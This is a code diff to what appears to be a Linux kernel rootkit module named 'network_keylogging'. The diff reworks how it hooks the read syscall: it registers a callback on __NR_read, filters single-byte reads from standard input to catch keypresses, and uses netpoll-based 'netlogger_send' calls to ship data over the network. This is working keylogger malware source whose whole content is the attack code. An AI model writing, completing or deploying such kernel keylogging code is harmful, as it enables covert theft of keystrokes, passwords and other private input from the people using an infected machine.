@@ -27,6 +27,7 @@
 #include <linux/netpoll.h>
 #include <linux/etherdevice.h>
 
+#include "core.h"
 
 /*******************************************************************************/
 /*                                                                             */
@@ -44,7 +45,6 @@
 
 /* Definition of global variables */
 static int show_debug_messages;
-asmlinkage long (*nk_original_read_syscall)(unsigned int, char __user *, size_t);   //TODO: should point to original_read
 struct netpoll *np;
 
 
@@ -52,7 +52,7 @@ struct netpoll *np;
 int network_keylogging_init(int);
 int network_keylogging_exit(void);
 
-asmlinkage long network_keylogging_read_syscall(unsigned int, char __user *, size_t);
+asmlinkage long network_keylogging_read_syscall(unsigned int, char __user *, size_t, long ret);
 
 static void netlogger_init(void);
 static void netlogger_exit(void);
@@ -72,6 +72,7 @@ int network_keylogging_init(int debug_mode_on)
 	show_debug_messages = debug_mode_on;
 
 	netlogger_init();
+	register_callback(__NR_read, (void *)network_keylogging_read_syscall);
 	netlogger_send(-1, "netlogger_started", 17);
 
 	DEBUG_PRINT("initialized");
@@ -83,6 +84,7 @@ int network_keylogging_init(int debug_mode_on)
 int network_keylogging_exit(void)
 {
 	netlogger_send(-1, "netlogger exiting", 17);
+	deregister_callback(__NR_read, (void *)network_keylogging_read_syscall);
 	netlogger_exit();
 
 	DEBUG_PRINT("exited");
@@ -91,13 +93,8 @@ int network_keylogging_exit(void)
 }
 
 
-asmlinkage long network_keylogging_read_syscall(unsigned int fd, char __user *buf, size_t count)
+asmlinkage long network_keylogging_read_syscall(unsigned int fd, char __user *buf, size_t count, long ret)
 {
-	long ret;
-
-	/* Call original read_syscall */
-	ret = nk_original_read_syscall(fd, buf, count);
-
 	/* A keypress has a length of 1 byte and is read from STDIN (fd == 0) */
 	if (fd != 0)
 		return ret;
